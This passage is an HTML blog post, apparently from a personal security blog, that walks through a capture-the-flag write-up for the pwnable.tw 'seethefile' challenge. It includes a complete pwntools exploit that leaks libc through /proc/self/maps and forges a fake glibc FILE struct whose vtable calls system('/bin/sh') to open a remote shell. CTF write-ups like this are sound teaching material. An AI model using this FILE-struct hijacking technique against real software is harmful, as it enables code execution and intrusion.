+                    </span><span style="font-style:italic;color:#969896;">/* ASCII &#39;}&#39; */</span><span style="color:#323232;">
+      pcVar1 </span><span style="font-weight:bold;color:#a71d5d;">= </span><span style="color:#62a35c;">strchr</span><span style="color:#323232;">(filebuf,</span><span style="color:#0086b3;">0x7d</span><span style="color:#323232;">);
+      </span><span style="font-weight:bold;color:#a71d5d;">if </span><span style="color:#323232;">(pcVar1 </span><span style="font-weight:bold;color:#a71d5d;">== </span><span style="color:#323232;">(</span><span style="font-weight:bold;color:#a71d5d;">char *</span><span style="color:#323232;">)</span><span style="color:#0086b3;">0x0</span><span style="color:#323232;">) {
+        </span><span style="color:#62a35c;">puts</span><span style="color:#323232;">(filebuf);
+        </span><span style="font-weight:bold;color:#a71d5d;">return</span><span style="color:#323232;">;
+      }
+    }
+  }
+  </span><span style="color:#62a35c;">puts</span><span style="color:#323232;">(</span><span style="color:#183691;">&quot;you can</span><span style="color:#0086b3;">\&#39;</span><span style="color:#183691;">t see it&quot;</span><span style="color:#323232;">);
+                    </span><span style="font-style:italic;color:#969896;">/* WARNING: Subroutine does not return */
+  </span><span style="color:#62a35c;">exit</span><span style="color:#323232;">(</span><span style="color:#0086b3;">1</span><span style="color:#323232;">);
+}
+</span></code></pre>
+<p>This prints the contents of the previously loaded memory buffer as long as it doesn't contain &quot;FLAG&quot; or the character '}'.</p>
+<h2 id="closefile">closefile</h2>
+<pre style="background-color:#ffffff;">
+<code><span style="font-weight:bold;color:#a71d5d;">void </span><span style="font-weight:bold;color:#795da3;">closefile</span><span style="color:#323232;">(</span><span style="font-weight:bold;color:#a71d5d;">void</span><span style="color:#323232;">)
+
+{
+  </span><span style="font-weight:bold;color:#a71d5d;">if </span><span style="color:#323232;">(fp </span><span style="font-weight:bold;color:#a71d5d;">== </span><span style="color:#323232;">(FILE </span><span style="font-weight:bold;color:#a71d5d;">*</span><span style="color:#323232;">)</span><span style="color:#0086b3;">0x0</span><span style="color:#323232;">) {
+    </span><span style="color:#62a35c;">puts</span><span style="color:#323232;">(</span><span style="color:#183691;">&quot;Nothing need to close&quot;</span><span style="color:#323232;">);
+  }
+  </span><span style="font-weight:bold;color:#a71d5d;">else </span><span style="color:#323232;">{
+    </span><span style="color:#62a35c;">fclose</span><span style="color:#323232;">(fp);
+  }
+  fp </span><span style="font-weight:bold;color:#a71d5d;">= </span><span style="color:#323232;">(FILE </span><span style="font-weight:bold;color:#a71d5d;">*</span><span style="color:#323232;">)</span><span style="color:#0086b3;">0x0</span><span style="color:#323232;">;
+  </span><span style="font-weight:bold;color:#a71d5d;">return</span><span style="color:#323232;">;
+}
+</span></code></pre>
+<p>This closes the previously opened file.</p>
+<h1 id="attacking-the-program">Attacking the Program</h1>
+<p>I will be using <a href="https://github.com/Gallopsled/pwntools">pwntools</a> to facilitate communications with the binary and the 
+remote server.</p>
+<p>To start off, we need to load the binary and the corresponding libc:</p>
+<pre style="background-color:#ffffff;">
+<code><span style="font-weight:bold;color:#a71d5d;">from </span><span style="color:#323232;">pwn </span><span style="font-weight:bold;color:#a71d5d;">import </span><span style="color:#0086b3;">*
+
+</span><span style="color:#323232;">context.binary </span><span style="font-weight:bold;color:#a71d5d;">= </span><span style="color:#183691;">&#39;./seethefile&#39;
+</span><span style="color:#323232;">context.terminal </span><span style="font-weight:bold;color:#a71d5d;">= </span><span style="color:#183691;">&#39;/bin/sh&#39;
+
+</span><span style="color:#323232;">elf </span><span style="font-weight:bold;color:#a71d5d;">= </span><span style="color:#323232;">ELF(</span><span style="color:#183691;">&#39;./seethefile&#39;</span><span style="color:#323232;">)
+</span><span style="font-style:italic;color:#969896;">#libc = ELF(&#39;./libc_32.so.6&#39;)                     # Remote libc
+</span><span style="color:#323232;">libc </span><span style="font-weight:bold;color:#a71d5d;">= </span><span style="color:#323232;">ELF(</span><span style="color:#183691;">&#39;/lib/i386-linux-gnu/libc-2.23.so&#39;</span><span style="color:#323232;">)    </span><span style="font-style:italic;color:#969896;"># Local libc
+
+</span><span style="color:#323232;">r </span><span style="font-weight:bold;color:#a71d5d;">= </span><span style="color:#323232;">process(</span><span style="color:#183691;">&#39;./seethefile&#39;</span><span style="color:#323232;">)
+gdb.attach(r)
+</span><span style="font-style:italic;color:#969896;">#r = remote(&#39;chall.pwnable.tw&#39;, 10200)
+</span></code></pre>
+<p>I also chose to define some helper functions to abstract communications with the binary:</p>
+<pre style="background-color:#ffffff;">
+<code><span style="font-weight:bold;color:#a71d5d;">def </span><span style="font-weight:bold;color:#323232;">openfile</span><span style="color:#323232;">(path):
+        r.recvuntil(</span><span style="color:#183691;">&#39;choice :&#39;</span><span style="color:#323232;">)
+        r.sendline(</span><span style="color:#183691;">&quot;1&quot;</span><span style="color:#323232;">)
+        r.recvuntil(</span><span style="color:#183691;">&quot;see :&quot;</span><span style="color:#323232;">)
+        r.sendline(path)
+
+</span><span style="font-weight:bold;color:#a71d5d;">def </span><span style="font-weight:bold;color:#323232;">readfile</span><span style="color:#323232;">():
+        r.recvuntil(</span><span style="color:#183691;">&#39;choice :&#39;</span><span style="color:#323232;">)
+        r.sendline(</span><span style="color:#183691;">&quot;2&quot;</span><span style="color:#323232;">)
+
+</span><span style="font-weight:bold;color:#a71d5d;">def </span><span style="font-weight:bold;color:#323232;">writefile</span><span style="color:#323232;">():
+        r.recvuntil(</span><span style="color:#183691;">&#39;choice :&#39;</span><span style="color:#323232;">)
+        r.sendline(</span><span style="color:#183691;">&quot;3&quot;</span><span style="color:#323232;">)
+        </span><span style="font-weight:bold;color:#a71d5d;">return </span><span style="color:#323232;">r.recvuntil(</span><span style="color:#183691;">&#39;---------------MENU---------------&#39;</span><span style="color:#323232;">)[:</span><span style="font-weight:bold;color:#a71d5d;">-</span><span style="color:#62a35c;">len</span><span style="color:#323232;">(</span><span style="color:#183691;">&#39;---------------MENU---------------&#39;</span><span style="color:#323232;">)]
+
+</span><span style="font-weight:bold;color:#a71d5d;">def </span><span style="font-weight:bold;color:#323232;">closefile</span><span style="color:#323232;">():
+        r.recvuntil(</span><span style="color:#183691;">&#39;choice :&#39;</span><span style="color:#323232;">)
+        r.sendline(</span><span style="color:#183691;">&quot;4&quot;</span><span style="color:#323232;">)
+
+</span><span style="font-weight:bold;color:#a71d5d;">def </span><span style="font-weight:bold;color:#323232;">exit</span><span style="color:#323232;">(name):
+        r.recvuntil(</span><span style="color:#183691;">&#39;choice :&#39;</span><span style="color:#323232;">)
+        r.sendline(</span><span style="color:#183691;">&quot;5&quot;</span><span style="color:#323232;">)
+        r.recvuntil(</span><span style="color:#183691;">&#39;name :&#39;</span><span style="color:#323232;">)
+        r.sendline(name)
+</span></code></pre><h2 id="leaking-libc-base">Leaking libc base</h2>
+<p>If we want to get a shell, we need to know the address of <code>system</code> in memory. We can use the psuedo-file <code>/proc/self/maps</code>
+which contains a list of loaded memory regions of the reading process. On the remote service, we need to call <code>readfile</code>
+twice because libc's entry appears in the second set of 400 characters:</p>
+<p><img src="/posts/pwnable-tw-seethefile/5e8193f54304800866d69179.png" alt="" /></p>
+<p>This would translate to the following in the exploit script:</p>
+<pre style="background-color:#ffffff;">
+<code><span style="color:#323232;">openfile(</span><span style="color:#183691;">&#39;/proc/self/maps&#39;</span><span style="color:#323232;">)
+readfile()
+readfile()
+
+libc.address </span><span style="font-weight:bold;color:#a71d5d;">= </span><span style="color:#0086b3;">int</span><span style="color:#323232;">([x.split(</span><span style="color:#183691;">&#39;-&#39;</span><span style="color:#323232;">)[</span><span style="color:#0086b3;">0</span><span style="color:#323232;">] </span><span style="font-weight:bold;color:#a71d5d;">for </span><span style="color:#323232;">x </span><span style="font-weight:bold;color:#a71d5d;">in </span><span style="color:#323232;">writefile().split(</span><span style="color:#183691;">&#39;</span><span style="color:#0086b3;">\n</span><span style="color:#183691;">&#39;</span><span style="color:#323232;">) </span><span style="font-weight:bold;color:#a71d5d;">if </span><span style="color:#323232;">x.endswith(</span><span style="color:#183691;">&#39;.so&#39;</span><span style="color:#323232;">)][</span><span style="color:#0086b3;">0</span><span style="color:#323232;">], </span><span style="color:#0086b3;">16</span><span style="color:#323232;">)
+</span></code></pre><h2 id="faking-a-file-struct">Faking a FILE struct</h2>
+<h3 id="choosing-the-flags">Choosing the flags</h3>
+<p>If we simply create a file struct with only <code>vtable</code> set, we will receive a segfault. Looking at the source code of 
+<a href="https://elixir.bootlin.com/glibc/glibc-2.23/source/libio/oldiofclose.c#L36"><code>fclose</code></a>, we see multiple fields of the 
+struct being dereferenced:</p>
+<pre style="background-color:#ffffff;">
+<code><span style="font-weight:bold;color:#a71d5d;">int
+</span><span style="font-weight:bold;color:#795da3;">attribute_compat_text_section
+</span><span style="color:#323232;">_IO_old_fclose (_IO_FILE </span><span style="font-weight:bold;color:#a71d5d;">*</span><span style="color:#323232;">fp)
+{
+  </span><span style="font-weight:bold;color:#a71d5d;">int</span><span style="color:#323232;"> status;
+
+  CHECK_FILE(fp, EOF);
+
+  </span><span style="font-style:italic;color:#969896;">/* We desperately try to help programs which are using streams in a
+     strange way and mix old and new functions.  Detect new streams
+     here.  */
+  </span><span style="font-weight:bold;color:#a71d5d;">if </span><span style="color:#323232;">(fp-&gt;_vtable_offset </span><span style="font-weight:bold;color:#a71d5d;">== </span><span style="color:#0086b3;">0</span><span style="color:#323232;">)
+    </span><span style="font-weight:bold;color:#a71d5d;">return </span><span style="color:#323232;">_IO_new_fclose (fp);
+
+  </span><span style="font-style:italic;color:#969896;">/* First unlink the stream.  */
+  </span><span style="font-weight:bold;color:#a71d5d;">if </span><span style="color:#323232;">(fp-&gt;_IO_file_flags </span><span style="font-weight:bold;color:#a71d5d;">&amp;</span><span style="color:#323232;"> _IO_IS_FILEBUF)
+    _IO_un_link ((</span><span style="font-weight:bold;color:#a71d5d;">struct</span><span style="color:#323232;"> _IO_FILE_plus </span><span style="font-weight:bold;color:#a71d5d;">*</span><span style="color:#323232;">) fp);
+
+  _IO_acquire_lock (fp);
+  </span><span style="font-weight:bold;color:#a71d5d;">if </span><span style="color:#323232;">(fp-&gt;_IO_file_flags </span><span style="font-weight:bold;color:#a71d5d;">&amp;</span><span style="color:#323232;"> _IO_IS_FILEBUF)
+    status </span><span style="font-weight:bold;color:#a71d5d;">= </span><span style="color:#323232;">_IO_old_file_close_it (fp);
+  </span><span style="font-weight:bold;color:#a71d5d;">else</span><span style="color:#323232;">
+    status </span><span style="font-weight:bold;color:#a71d5d;">=</span><span style="color:#323232;"> fp-&gt;_flags </span><span style="font-weight:bold;color:#a71d5d;">&amp;</span><span style="color:#323232;"> _IO_ERR_SEEN </span><span style="font-weight:bold;color:#a71d5d;">? -</span><span style="color:#0086b3;">1 </span><span style="font-weight:bold;color:#a71d5d;">: </span><span style="color:#0086b3;">0</span><span style="color:#323232;">;
+  _IO_release_lock (fp);
+  _IO_FINISH (fp);
+  </span><span style="font-weight:bold;color:#a71d5d;">if </span><span style="color:#323232;">(_IO_have_backup (fp))
+    _IO_free_backup_area (fp);
+  </span><span style="font-weight:bold;color:#a71d5d;">if </span><span style="color:#323232;">(fp </span><span style="font-weight:bold;color:#a71d5d;">!=</span><span style="color:#323232;"> _IO_stdin </span><span style="font-weight:bold;color:#a71d5d;">&amp;&amp;</span><span style="color:#323232;"> fp </span><span style="font-weight:bold;color:#a71d5d;">!=</span><span style="color:#323232;"> _IO_stdout </span><span style="font-weight:bold;color:#a71d5d;">&amp;&amp;</span><span style="color:#323232;"> fp </span><span style="font-weight:bold;color:#a71d5d;">!=</span><span style="color:#323232;"> _IO_stderr)
+    {
+      fp-&gt;_IO_file_flags </span><span style="font-weight:bold;color:#a71d5d;">= </span><span style="color:#0086b3;">0</span><span style="color:#323232;">;
+      </span><span style="color:#62a35c;">free</span><span style="color:#323232;">(fp);
+    }
+
+  </span><span style="font-weight:bold;color:#a71d5d;">return</span><span style="color:#323232;"> status;
+}
+</span></code></pre>
+<p>We can skip large chunks of this function if <code>_IO_IS_FILEBUF</code> is not set. Looking at the source code of libc, I found 
+that the bit mask for _IO_IS_FILEBUF is <code>0x2000</code>. The bitwise NOT is <code>0xFFFFDFFF</code>, so we can set the flags of our fake 
+FILE struct to that.</p>
+<h3 id="bypassing-the-lock">Bypassing the lock</h3>
+<p>Another interesting macro <code>_IO_aquire_lock(fp)</code> is used. The 
+<a href="https://elixir.bootlin.com/glibc/glibc-2.23/source/sysdeps/nptl/stdio-lock.h#L29">struct <code>_IO_lock_t</code></a> isn't too complicated:</p>
+<pre style="background-color:#ffffff;">
+<code><span style="font-weight:bold;color:#a71d5d;">typedef struct </span><span style="color:#323232;">{ 
+     </span><span style="font-weight:bold;color:#a71d5d;">int</span><span style="color:#323232;"> lock; 
+     </span><span style="font-weight:bold;color:#a71d5d;">int</span><span style="color:#323232;"> cnt; 
+     </span><span style="font-weight:bold;color:#a71d5d;">void *</span><span style="color:#323232;">owner;
+} _IO_lock_t;
+</span></code></pre>
+<p><code>_lock</code> is locked if <code>_lock-&gt;cnt != 0</code>. Thus, if we set <code>_lock</code> to a buffer of zeroes, libc will be able to aquire the 
+lock by incrementing <code>cnt</code>. Similarly, its counterpart, <code>_IO_release_lock</code> decrements <code>cnt</code>. A good target buffer is the 
+end of the <code>filename</code> buffer.</p>
+<p>We can add the following onto our exploit script:</p>
+<pre style="background-color:#ffffff;">
+<code><span style="color:#323232;">file </span><span style="font-weight:bold;color:#a71d5d;">= </span><span style="color:#183691;">&quot;&quot;                                       </span><span style="font-style:italic;color:#969896;"># file
+</span><span style="color:#323232;">file </span><span style="font-weight:bold;color:#a71d5d;">+= </span><span style="color:#323232;">p32(</span><span style="color:#0086b3;">0xFFFFDFFF</span><span style="color:#323232;">)                         </span><span style="font-style:italic;color:#969896;"># file-&gt;_flags  set _IO_IS_FILEBUF bit to false
+</span><span style="color:#323232;">file </span><span style="font-weight:bold;color:#a71d5d;">+= </span><span style="color:#183691;">&quot;;/bin/sh;&quot;                             </span><span style="font-style:italic;color:#969896;"># file-&gt;???     to be interpreted as a string
+
+</span><span style="color:#323232;">payload </span><span style="font-weight:bold;color:#a71d5d;">= </span><span style="color:#323232;">file.ljust(</span><span style="color:#0086b3;">32</span><span style="color:#323232;">, </span><span style="color:#183691;">&#39;A&#39;</span><span style="color:#323232;">)                   </span><span style="font-style:italic;color:#969896;"># padding to reach *fp
+</span><span style="color:#323232;">payload </span><span style="font-weight:bold;color:#a71d5d;">+= </span><span style="color:#323232;">p32(elf.symbols[</span><span style="color:#183691;">&#39;name&#39;</span><span style="color:#323232;">])             </span><span style="font-style:italic;color:#969896;"># *fp           overwrite *fp to point to the start of the name buffer
+</span><span style="color:#323232;">payload </span><span style="font-weight:bold;color:#a71d5d;">+= </span><span style="color:#183691;">&#39;`&#39;                                  </span><span style="font-style:italic;color:#969896;"># padding
+</span><span style="color:#323232;">payload </span><span style="font-weight:bold;color:#a71d5d;">+= </span><span style="color:#183691;">&#39;A&#39; </span><span style="font-weight:bold;color:#a71d5d;">* </span><span style="color:#323232;">(</span><span style="color:#0086b3;">72</span><span style="font-weight:bold;color:#a71d5d;">-</span><span style="color:#0086b3;">37</span><span style="color:#323232;">)                        </span><span style="font-style:italic;color:#969896;"># padding
+</span><span style="color:#323232;">payload </span><span style="font-weight:bold;color:#a71d5d;">+= </span><span style="color:#323232;">p32(elf.symbols[</span><span style="color:#183691;">&#39;filename&#39;</span><span style="color:#323232;">] </span><span style="font-weight:bold;color:#a71d5d;">+ </span><span style="color:#0086b3;">32</span><span style="color:#323232;">)    </span><span style="font-style:italic;color:#969896;"># file-&gt;_lock   vtable-&gt;__dummy
+</span><span style="color:#323232;">payload </span><span style="font-weight:bold;color:#a71d5d;">+= </span><span style="color:#323232;">p32(elf.symbols[</span><span style="color:#183691;">&#39;name&#39;</span><span style="color:#323232;">] </span><span style="font-weight:bold;color:#a71d5d;">+ </span><span style="color:#0086b3;">72</span><span style="color:#323232;">)        </span><span style="font-style:italic;color:#969896;"># file-&gt;vtable  vtable-&gt;__dummy2
+</span><span style="color:#323232;">payload </span><span style="font-weight:bold;color:#a71d5d;">+= </span><span style="color:#323232;">p32(libc.symbols[</span><span style="color:#183691;">&#39;system&#39;</span><span style="color:#323232;">])          </span><span style="font-style:italic;color:#969896;">#               vtable-&gt;__finish
+
+</span><span style="color:#323232;">exit(payload)
+</span></code></pre><h2 id="overview">Overview</h2>
+<p>This diagram displays my payload (on the right) alongside the corresponding structures. The <code>_IO_jump_t</code> and the 
+<code>_IO_FILE</code> structs are overlaid on each other.</p>
+<p>svg(path=&quot;5e81a81b4304800866d6917b.svg&quot;)</p>
+<h2 id="final-script">Final Script</h2>
+<pre style="background-color:#ffffff;">
+<code><span style="font-weight:bold;color:#a71d5d;">from </span><span style="color:#323232;">pwn </span><span style="font-weight:bold;color:#a71d5d;">import </span><span style="color:#0086b3;">*
+
+</span><span style="color:#323232;">context.binary </span><span style="font-weight:bold;color:#a71d5d;">= </span><span style="color:#183691;">&#39;./seethefile&#39;
+
+</span><span style="color:#323232;">elf </span><span style="font-weight:bold;color:#a71d5d;">= </span><span style="color:#323232;">ELF(</span><span style="color:#183691;">&#39;./seethefile&#39;</span><span style="color:#323232;">)
+libc </span><span style="font-weight:bold;color:#a71d5d;">= </span><span style="color:#323232;">ELF(</span><span style="color:#183691;">&#39;./libc_32.so.6&#39;</span><span style="color:#323232;">)
+
+r </span><span style="font-weight:bold;color:#a71d5d;">= </span><span style="color:#323232;">remote(</span><span style="color:#183691;">&#39;chall.pwnable.tw&#39;</span><span style="color:#323232;">, </span><span style="color:#0086b3;">10200</span><span style="color:#323232;">)
+
+</span><span style="font-weight:bold;color:#a71d5d;">def </span><span style="font-weight:bold;color:#323232;">openfile</span><span style="color:#323232;">(path):
+        r.recvuntil(</span><span style="color:#183691;">&#39;choice :&#39;</span><span style="color:#323232;">)
+        r.sendline(</span><span style="color:#183691;">&quot;1&quot;</span><span style="color:#323232;">)
+        r.recvuntil(</span><span style="color:#183691;">&quot;see :&quot;</span><span style="color:#323232;">)
+        r.sendline(path)
+
+</span><span style="font-weight:bold;color:#a71d5d;">def </span><span style="font-weight:bold;color:#323232;">readfile</span><span style="color:#323232;">():
+        r.recvuntil(</span><span style="color:#183691;">&#39;choice :&#39;</span><span style="color:#323232;">)
+        r.sendline(</span><span style="color:#183691;">&quot;2&quot;</span><span style="color:#323232;">)
+
+</span><span style="font-weight:bold;color:#a71d5d;">def </span><span style="font-weight:bold;color:#323232;">writefile</span><span style="color:#323232;">():
+        r.recvuntil(</span><span style="color:#183691;">&#39;choice :&#39;</span><span style="color:#323232;">)
+        r.sendline(</span><span style="color:#183691;">&quot;3&quot;</span><span style="color:#323232;">)
+        </span><span style="font-weight:bold;color:#a71d5d;">return </span><span style="color:#323232;">r.recvuntil(</span><span style="color:#183691;">&#39;---------------MENU---------------&#39;</span><span style="color:#323232;">)[:</span><span style="font-weight:bold;color:#a71d5d;">-</span><span style="color:#62a35c;">len</span><span style="color:#323232;">(</span><span style="color:#183691;">&#39;---------------MENU---------------&#39;</span><span style="color:#323232;">)]
+
+</span><span style="font-weight:bold;color:#a71d5d;">def </span><span style="font-weight:bold;color:#323232;">closefile</span><span style="color:#323232;">():
+        r.recvuntil(</span><span style="color:#183691;">&#39;choice :&#39;</span><span style="color:#323232;">)
+        r.sendline(</span><span style="color:#183691;">&quot;4&quot;</span><span style="color:#323232;">)
+
+</span><span style="font-weight:bold;color:#a71d5d;">def </span><span style="font-weight:bold;color:#323232;">exit</span><span style="color:#323232;">(name):
+        r.recvuntil(</span><span style="color:#183691;">&#39;choice :&#39;</span><span style="color:#323232;">)
+        r.sendline(</span><span style="color:#183691;">&quot;5&quot;</span><span style="color:#323232;">)
+        r.recvuntil(</span><span style="color:#183691;">&#39;name :&#39;</span><span style="color:#323232;">)
+        r.sendline(name)
+
+openfile(</span><span style="color:#183691;">&#39;/proc/self/maps&#39;</span><span style="color:#323232;">)
+readfile()
+readfile()
+
+libc.address </span><span style="font-weight:bold;color:#a71d5d;">= </span><span style="color:#0086b3;">int</span><span style="color:#323232;">([x.split(</span><span style="color:#183691;">&#39;-&#39;</span><span style="color:#323232;">)[</span><span style="color:#0086b3;">0</span><span style="color:#323232;">] </span><span style="font-weight:bold;color:#a71d5d;">for </span><span style="color:#323232;">x </span><span style="font-weight:bold;color:#a71d5d;">in </span><span style="color:#323232;">writefile().split(</span><span style="color:#183691;">&#39;</span><span style="color:#0086b3;">\n</span><span style="color:#183691;">&#39;</span><span style="color:#323232;">) </span><span style="font-weight:bold;color:#a71d5d;">if </span><span style="color:#323232;">x.endswith(</span><span style="color:#183691;">&#39;.so&#39;</span><span style="color:#323232;">)][</span><span style="color:#0086b3;">0</span><span style="color:#323232;">], </span><span style="color:#0086b3;">16</span><span style="color:#323232;">)
+
+info(</span><span style="color:#183691;">&quot;Found libc base &quot; </span><span style="font-weight:bold;color:#a71d5d;">+ </span><span style="color:#62a35c;">hex</span><span style="color:#323232;">(libc.address))
+info(</span><span style="color:#183691;">&quot;Address of system &quot; </span><span style="font-weight:bold;color:#a71d5d;">+ </span><span style="color:#62a35c;">hex</span><span style="color:#323232;">(libc.symbols[</span><span style="color:#183691;">&#39;system&#39;</span><span style="color:#323232;">]))
+
+file </span><span style="font-weight:bold;color:#a71d5d;">= </span><span style="color:#183691;">&quot;&quot;                                       </span><span style="font-style:italic;color:#969896;"># file
+</span><span style="color:#323232;">file </span><span style="font-weight:bold;color:#a71d5d;">+= </span><span style="color:#323232;">p32(</span><span style="color:#0086b3;">0xFFFFDFFF</span><span style="color:#323232;">)                         </span><span style="font-style:italic;color:#969896;"># file-&gt;_flags  set _IO_IS_FILEBUF bit to false
+</span><span style="color:#323232;">file </span><span style="font-weight:bold;color:#a71d5d;">+= </span><span style="color:#183691;">&quot;;/bin/sh;&quot;                             </span><span style="font-style:italic;color:#969896;"># file-&gt;???     to be interpreted as a string
+
+</span><span style="color:#323232;">payload </span><span style="font-weight:bold;color:#a71d5d;">= </span><span style="color:#323232;">file.ljust(</span><span style="color:#0086b3;">32</span><span style="color:#323232;">, </span><span style="color:#183691;">&#39;A&#39;</span><span style="color:#323232;">)                   </span><span style="font-style:italic;color:#969896;"># padding to reach *fp
+</span><span style="color:#323232;">payload </span><span style="font-weight:bold;color:#a71d5d;">+= </span><span style="color:#323232;">p32(elf.symbols[</span><span style="color:#183691;">&#39;name&#39;</span><span style="color:#323232;">])             </span><span style="font-style:italic;color:#969896;"># *fp           overwrite *fp to point to the start of the name buffer
+</span><span style="color:#323232;">payload </span><span style="font-weight:bold;color:#a71d5d;">+= </span><span style="color:#183691;">&#39;`&#39;                                  </span><span style="font-style:italic;color:#969896;"># padding
+</span><span style="color:#323232;">payload </span><span style="font-weight:bold;color:#a71d5d;">+= </span><span style="color:#183691;">&#39;A&#39; </span><span style="font-weight:bold;color:#a71d5d;">* </span><span style="color:#323232;">(</span><span style="color:#0086b3;">72</span><span style="font-weight:bold;color:#a71d5d;">-</span><span style="color:#0086b3;">37</span><span style="color:#323232;">)                        </span><span style="font-style:italic;color:#969896;"># padding
+</span><span style="color:#323232;">payload </span><span style="font-weight:bold;color:#a71d5d;">+= </span><span style="color:#323232;">p32(elf.symbols[</span><span style="color:#183691;">&#39;filename&#39;</span><span style="color:#323232;">] </span><span style="font-weight:bold;color:#a71d5d;">+ </span><span style="color:#0086b3;">32</span><span style="color:#323232;">)    </span><span style="font-style:italic;color:#969896;"># file-&gt;_lock   vtable-&gt;__dummy
+</span><span style="color:#323232;">payload </span><span style="font-weight:bold;color:#a71d5d;">+= </span><span style="color:#323232;">p32(elf.symbols[</span><span style="color:#183691;">&#39;name&#39;</span><span style="color:#323232;">] </span><span style="font-weight:bold;color:#a71d5d;">+ </span><span style="color:#0086b3;">72</span><span style="color:#323232;">)        </span><span style="font-style:italic;color:#969896;"># file-&gt;vtable  vtable-&gt;__dummy2
+</span><span style="color:#323232;">payload </span><span style="font-weight:bold;color:#a71d5d;">+= </span><span style="color:#323232;">p32(libc.symbols[</span><span style="color:#183691;">&#39;system&#39;</span><span style="color:#323232;">])          </span><span style="font-style:italic;color:#969896;">#               vtable-&gt;__finish
+
+</span><span style="color:#323232;">exit(payload)
+
+r.interactive()
+</span></code></pre>
+<p>Running this gives us a shell on the remote server:</p>
+<p><img src="/posts/pwnable-tw-seethefile/5e81ac654304800866d6917d.png" alt="" /></p>
+<h1 id="further-reading">Further Reading</h1>
+<p>These are some resources I found helpful while solving this challenge.</p>
+<ol>
+<li><a href="https://elixir.bootlin.com/glibc/glibc-2.23/source">https://elixir.bootlin.com/glibc/glibc-2.23/source</a></li>
+<li><a href="https://www.slideshare.net/AngelBoy1/play-with-file-structure-yet-another-binary-exploit-technique">https://www.slideshare.net/AngelBoy1/play-with-file-structure-yet-another-binary-exploit-technique</a></li>
+<li><a href="https://gsec.hitb.org/materials/sg2018/WHITEPAPERS/FILE%20Structures%20-%20Another%20Binary%20Exploitation%20Technique%20-%20An-Jie%20Yang.pdf">https://gsec.hitb.org/materials/sg2018/WHITEPAPERS/FILE%20Structures%20-%20Another%20Binary%20Exploitation%20Technique%20-%20An-Jie%20Yang.pdf</a></li>
+</ol>
+
+</div>
+
+
+</div>
+
+<script src="https://utteranc.es/client.js"
+        repo="srikavin/blog"
+        issue-term="url"
+        label="💬comments"
+        theme="github-light"
+        crossorigin="anonymous"
+        async>
+</script>
+
+    </div>
+</section>
+
+<script src="/bundle.js"></script>
+ 
+
+</body>
+
+</html>
